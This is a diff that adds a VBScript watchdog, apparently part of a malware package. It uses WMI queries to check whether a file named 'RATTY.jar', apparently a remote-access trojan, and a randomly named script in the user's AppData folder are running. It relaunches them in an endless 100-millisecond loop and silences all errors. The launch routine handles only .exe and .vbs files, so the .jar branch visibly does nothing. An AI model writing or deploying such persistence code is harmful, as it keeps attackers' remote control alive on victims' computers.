@@ -1,0 +1,66 @@
+Set objShell = CreateObject("WScript.Shell")
+Set wmiObj = GetObject("winmgmts:\\.\root\cimv2")
+dim file1, file2, PID1, PID2, appdatadir
+appdatadir = objShell.ExpandEnvironmentStrings("%appdata%")
+file1 = "RATTY.jar"
+file2 = "UhVHQvjFGb.vbs"
+On Error Resume Next
+dim running 
+running = IsFileRunning(file1)
+if running = false then
+PID1 = RunFile(file1)
+else
+PID1 = running
+end if
+Set running = Nothing
+running = IsFileRunning(file2)
+if running = false then
+PID2 = RunFile(file2)
+else
+PID2 = running
+end if
+Set running = Nothing
+while true
+if IsProcessRunning(PID1) = false then
+PID1 = RunFile(file1)
+end if
+if IsProcessRunning(PID2) = false then
+PID2 = RunFile(file2)
+end if
+Wscript.Sleep(100)
+wend
+function IsProcessRunning(pid)
+Set result = wmiObj.ExecQuery("Select * From Win32_Process Where ProcessId=" & pid)
+if result.Count > 0 then
+IsProcessRunning = true
+else
+IsProcessRunning = false
+end if
+end function
+function IsFileRunning(filename)
+dim pname
+if Right(filename, 4) = ".vbs" then
+pname = "wscript.exe"
+else
+pname = filename
+end if
+Set result = wmiObj.ExecQuery("Select * From Win32_Process Where Name='" & pname & "'")
+dim found
+found = false
+for each item in result
+if InStr(item.CommandLine, filename) > 0 then
+found = item.ProcessID
+exit for
+end if
+next
+IsFileRunning = found
+end function
+function RunFile(path)
+if Right(path, 4) = ".exe" then
+RunFile = objShell.Exec("""" & appdatadir & "\" & path & """").ProcessID
+elseif Right(path, 4) = ".vbs" then
+RunFile = objShell.Exec("Wscript " & """" & appdatadir & "\" & path & """").ProcessID
+else
+RunFile = 0
+end if
+end function
